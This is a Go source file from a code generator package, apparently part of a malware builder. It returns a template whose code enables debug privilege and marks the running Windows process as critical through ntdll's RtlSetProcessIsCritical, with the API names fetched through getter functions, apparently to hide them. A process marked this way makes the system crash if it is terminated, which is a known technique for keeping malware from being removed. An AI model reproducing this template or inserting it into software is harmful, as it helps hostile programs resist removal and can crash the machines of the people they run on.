package buildergen

import "strings"

func templateCriticalProcess() string {
	return strings.TrimSpace(`
func setCriticalProcess() {
	if !isAdmin() {
		return
	}

	ntdll := syscall.NewLazyDLL(getNtdllDLL())
	rtlAdjustPrivilege := ntdll.NewProc(getRtlAdjustPrivilegeName())
	rtlSetCritical := ntdll.NewProc(getRtlSetProcessIsCriticalName())

	var oldState uint32
	rtlAdjustPrivilege.Call(20, 1, 0, uintptr(unsafe.Pointer(&oldState)))

	rtlSetCritical.Call(1, 0, 0)
}

func unsetCriticalProcess() {
	ntdll := syscall.NewLazyDLL(getNtdllDLL())
	rtlSetCritical := ntdll.NewProc(getRtlSetProcessIsCriticalName())
	rtlSetCritical.Call(0, 0, 0)
}
`)
}
